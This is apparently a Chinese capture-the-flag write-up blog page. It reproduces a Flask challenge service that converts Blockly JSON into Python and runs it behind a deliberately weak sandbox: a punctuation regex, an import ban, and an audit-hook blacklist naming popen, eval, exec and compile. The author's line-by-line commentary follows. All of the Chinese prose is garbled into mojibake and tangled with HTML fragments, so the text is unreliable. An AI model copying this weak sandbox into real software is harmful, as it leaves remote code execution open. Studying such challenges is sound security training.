class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)</span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():</span><br><span class="line">            code = <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            code = <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        code += <span class="string">&quot;\n&quot;</span> + block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¸€ç‚¹å°ç–‘é—®ï¼Œè¿™ä¸ªä»£ç æœ‰å•¥ç”¨ï¼Œä¸ºå•¥æ²¡æ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><blockquote><p>â€‹è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°  <code>module_exists</code> ï¼Œç”¨äºæ£€æŸ¥ä¸€ä¸ªæŒ‡å®šçš„æ¨¡å—æ˜¯å¦å­˜åœ¨ã€‚è¿™ä¸ªå‡½æ•°é€šè¿‡å‡ ä¸ªæ­¥éª¤æ¥åˆ¤æ–­æ¨¡å—æ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”åŒºåˆ†äº†å†…ç½®æ¨¡å—ã€æ ‡å‡†åº“æ¨¡å—å’Œç¬¬ä¸‰æ–¹æˆ–æœ¬åœ°æ¨¡å—ã€‚ä¸‹é¢æ˜¯å¯¹è¿™æ®µä»£ç çš„é€è¡Œè§£é‡Šï¼š</p><ol><li><pre><code> def module_exists(module_name):</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - è¿™è¡Œå®šä¹‰äº†ä¸€ä¸ªåä¸º `module_exists` çš„å‡½æ•°ï¼Œå®ƒæ¥å—ä¸€ä¸ªå‚æ•° `module_name`ï¼Œå³è¦æ£€æŸ¥çš„æ¨¡å—åã€‚</span><br><span class="line"></span><br><span class="line">&gt;2. ```</span><br><span class="line">  spec = importlib.util.find_spec(module_name)</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨  <code>importlib.util.find_spec</code>  å‡½æ•°å°è¯•æ‰¾åˆ°åä¸º  <code>module_name</code>  çš„æ¨¡å—çš„è§„æ ¼ï¼ˆspecï¼‰ã€‚è¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªæ¨¡å—è§„æ ¼å¯¹è±¡ï¼Œå¦‚æœæ¨¡å—ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›  <code>None</code> ã€‚</li></ul><ol start="3"><li><pre><code> if spec is None:</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - è¿™è¡Œæ£€æŸ¥ `find_spec` è¿”å›çš„ `spec` æ˜¯å¦ä¸º `None`ã€‚å¦‚æœæ˜¯ï¼Œè¯´æ˜æ²¡æœ‰æ‰¾åˆ°æ¨¡å—ï¼Œæ‰§è¡Œä¸‹ä¸€è¡Œä»£ç ã€‚</span><br><span class="line"></span><br><span class="line">&gt;4. ```</span><br><span class="line">  return False</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ¨¡å—ä¸å­˜åœ¨ï¼ˆ <code>spec</code>  ä¸º  <code>None</code> ï¼‰ï¼Œå‡½æ•°è¿”å›  <code>False</code> ã€‚</li></ul><ol start="5"><li><pre><code> if module_name in sys.builtin_module_names:</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - è¿™è¡Œæ£€æŸ¥ `module_name` æ˜¯å¦åœ¨ `sys.builtin_module_names` åˆ—è¡¨ä¸­ã€‚`sys.builtin_module_names` åŒ…å«äº†æ‰€æœ‰å†…ç½®æ¨¡å—çš„åç§°ã€‚å¦‚æœ `module_name` æ˜¯å†…ç½®æ¨¡å—ï¼Œæ‰§è¡Œä¸‹ä¸€è¡Œä»£ç ã€‚</span><br><span class="line"></span><br><span class="line">&gt;6. ```</span><br><span class="line">  return True</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœ  <code>module_name</code>  æ˜¯å†…ç½®æ¨¡å—ï¼Œå‡½æ•°è¿”å›  <code>True</code> ã€‚</li></ul><ol start="7"><li><pre><code> if spec.origin:</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - è¿™è¡Œæ£€æŸ¥ `spec` å¯¹è±¡çš„ `origin` å±æ€§æ˜¯å¦å­˜åœ¨ã€‚`origin` å±æ€§é€šå¸¸åŒ…å«äº†æ¨¡å—çš„æ¥æºè·¯å¾„ã€‚å¦‚æœ `origin` å­˜åœ¨ï¼Œæ‰§è¡Œä¸‹ä¸€è¡Œä»£ç ã€‚</span><br><span class="line"></span><br><span class="line">&gt;8. ```</span><br><span class="line">  std_lib_path = os.path.dirname(os.__file__)</span><br></pre></td></tr></table></figure><ul><li>è¿™è¡Œè·å– Python æ ‡å‡†åº“çš„è·¯å¾„ã€‚ <code>os.__file__</code>  æ˜¯  <code>os</code>  æ¨¡å—çš„è·¯å¾„ï¼Œ <code>os.path.dirname</code>  è·å–è¿™ä¸ªè·¯å¾„çš„ç›®å½•éƒ¨åˆ†ï¼Œå³æ ‡å‡†åº“çš„æ ¹ç›®å½•ã€‚</li></ul><ol start="9"><li><pre><code> if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - è¿™è¡Œæ£€æŸ¥ `spec.origin` æ˜¯å¦ä»¥æ ‡å‡†åº“è·¯å¾„ `std_lib_path` å¼€å¤´ï¼Œå¹¶ä¸”ä¸ä»¥å½“å‰å·¥ä½œç›®å½• `os.getcwd()` å¼€å¤´ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿æ¨¡å—æ˜¯æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯å½“å‰å·¥ä½œç›®å½•ä¸‹çš„æ¨¡å—ã€‚å¦‚æœè¿™ä¸¤ä¸ªæ¡ä»¶éƒ½æ»¡è¶³ï¼Œæ‰§è¡Œä¸‹ä¸€è¡Œä»£ç ã€‚</span><br><span class="line"></span><br><span class="line">&gt;10. ```</span><br><span class="line">   return True</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ¨¡å—æ˜¯æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼Œå‡½æ•°è¿”å›  <code>True</code> ã€‚</li></ul><ol start="11"><li><pre><code>  return False</code></pre></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   - å¦‚æœæ¨¡å—æ—¢ä¸æ˜¯å†…ç½®æ¨¡å—ï¼Œä¹Ÿä¸æ˜¯æ ‡å‡†åº“æ¨¡å—ï¼Œå‡½æ•°è¿”å› `False`ã€‚</span><br><span class="line"></span><br><span class="line">&gt;æ€»ç»“ï¼šè¿™ä¸ªå‡½æ•°é€šè¿‡æ£€æŸ¥æ¨¡å—çš„è§„æ ¼ï¼ˆspecï¼‰ï¼Œåˆ¤æ–­æ¨¡å—æ˜¯å¦å­˜åœ¨ï¼Œå¹¶è¿›ä¸€æ­¥åŒºåˆ†æ¨¡å—æ˜¯å†…ç½®æ¨¡å—ã€æ ‡å‡†åº“æ¨¡å—è¿˜æ˜¯å…¶ä»–ç±»å‹çš„æ¨¡å—ã€‚å¦‚æœæ¨¡å—å­˜åœ¨ä¸”æ˜¯å†…ç½®æ¨¡å—æˆ–æ ‡å‡†åº“æ¨¡å—ï¼Œå‡½æ•°è¿”å› `True`ï¼›å¦åˆ™è¿”å› `False`ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â€‹é—®é¢˜ä¹Ÿå°±å‡ºç°åœ¨è¿™é‡Œï¼Œå‰åæˆ‘æ²¡å‘ç°æœ‰è°ƒç”¨è¿‡è¿™ä¸ªå‡½æ•°ï¼Œå…ˆæ— æ‰€è°“ï¼Œçœ‹çœ‹å®¡å…¶ä»–çš„ã€‚</span><br><span class="line"></span><br><span class="line">â€‹`blockly_json`å‡½æ•°å¼€å§‹ï¼Œå…ˆè¯»å–å‚æ•°ï¼Œä¹‹åè½¬UTF-8ä¹‹åæ‹¿ç»™json_to_pythonå»è½¬ä¸ºpythonä»£ç ï¼š</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">   python_code = &quot;&quot;</span><br><span class="line">   python_code += block_to_python(block) + &quot;\n&quot;</span><br></pre></td></tr></table></figure></blockquote><p>â€‹ç»§ç»­å®¡ block_to_pythonï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºï¼Œä» type é‡Œå–å€¼ï¼Œå¦‚æœæ˜¯ printï¼Œmaxï¼Œminï¼Œnext å°±é€’å½’ç»§ç»­åé¢çš„ä»£ç æˆ–è€…å‚æ•°ï¼Œç›´åˆ°æ²¡æœ‰ç›¸åº”å‚æ•°ä¸ºæ­¢ï¼Œä¹‹åå°±è¿”å› code äº†ï¼Œå½“é‡åˆ° text çš„è¯ï¼Œå°±å°†æ‰€æœ‰çš„å­—ç¬¦ä¸²è¿›è¡Œæ­£åˆ™æ¯”è¾ƒï¼Œé‡åˆ°ç¬¦å·å°±æ¸…ç©º code å‚æ•°ï¼Œå¦åˆ™ code åŠ ä¸Šå»ç„¶åè¿”å›ã€‚ä¹‹åå°±æ˜¯ do äº†ï¼Œè·å¾—æºç ï¼Œç„¶åæ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªæƒ…å†µæ„Ÿè§‰å¾ˆåƒæ˜¯æ²™ç®±äº†ï¼Œä¸å…è®¸æ‰§è¡ŒæŸäº›ç‰¹å®šçš„å‡½æ•°ï¼Œ</p><p>è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªåä¸º  <code>my_audit_hook</code>  çš„å‡½æ•°ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸º Python è§£é‡Šå™¨çš„å®¡è®¡é’©å­ï¼ˆaudit hookï¼‰ã€‚å®¡è®¡é’©å­æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå…è®¸å¼€å‘è€…åœ¨ Python æ‰§è¡Œç‰¹å®šäº‹ä»¶æ—¶æ’å…¥è‡ªå®šä¹‰çš„æ£€æŸ¥æˆ–è¡Œä¸ºã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Python 3.8 ä¸­è¢«å¼•å…¥ï¼Œä¸»è¦ç”¨äºå®‰å…¨ç›®çš„ï¼Œæ¯”å¦‚ç›‘æ§å’Œé™åˆ¶æŸäº›æ½œåœ¨å±é™©çš„æ“ä½œã€‚</p><blockquote><p>è®©æˆ‘ä»¬é€æ­¥è§£æè¿™æ®µä»£ç ï¼š</p><ol><li><p>å‡½æ•°å®šä¹‰</p><p>ï¼š</p><ul><li><code>def my_audit_hook(event_name, arg):</code> ï¼šå®šä¹‰äº†ä¸€ä¸ªåä¸º  <code>my_audit_hook</code>  çš„å‡½æ•°ï¼Œå®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼š <code>event_name</code>  å’Œ  <code>arg</code> ã€‚ <code>event_name</code>  æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè§¦å‘å®¡è®¡çš„äº‹ä»¶åç§°ï¼› <code>arg</code>  æ˜¯ä¸è¯¥äº‹ä»¶ç›¸å…³çš„é™„åŠ ä¿¡æ¯ï¼Œå…¶ç±»å‹å’Œç»“æ„å–å†³äºå…·ä½“çš„äº‹ä»¶ã€‚</li></ul></li><li><p>é»‘åå•</p><p>ï¼š</p><ul><li><code>blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</code> ï¼šå®šä¹‰äº†ä¸€ä¸ªåä¸º  <code>blacklist</code>  